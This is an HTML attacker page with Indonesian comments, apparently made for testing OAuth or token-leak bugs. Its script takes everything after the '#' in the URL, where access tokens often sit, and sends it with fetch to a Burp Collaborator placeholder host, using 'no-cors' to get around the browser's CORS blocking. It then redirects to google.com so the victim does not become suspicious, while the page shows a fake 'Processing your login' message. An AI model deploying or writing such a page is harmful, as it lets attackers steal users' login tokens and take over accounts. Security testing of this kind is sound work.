<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        // 1. Ambil hash (semua data setelah #)
        var fragment = window.location.hash;

        if (fragment) {
            // 2. Kirim data (Ganti URL di bawah dengan Collaborator milikmu!)
            fetch("https://[ID-COLLABORATOR-MU].oastify.com/?data=" + encodeURIComponent(fragment), {
                mode: 'no-cors' // Supaya tidak diblokir aturan CORS browser
            })
            .then(() => {
                // 3. Setelah sukses terkirim, tunggu 1 detik lalu redirect
                setTimeout(function() {
                    window.location.href = "https://google.com";
                }, 1000);
            })
            .catch((err) => {
                // Jika fetch gagal, langsung redirect saja agar tidak curiga
                window.location.href = "https://google.com";
            });
        }
    </script>
    <h1 style="font-family: sans-serif; text-align: center; margin-top: 20%;">
        Processing your login, please wait...
    </h1>
</body>
</html>
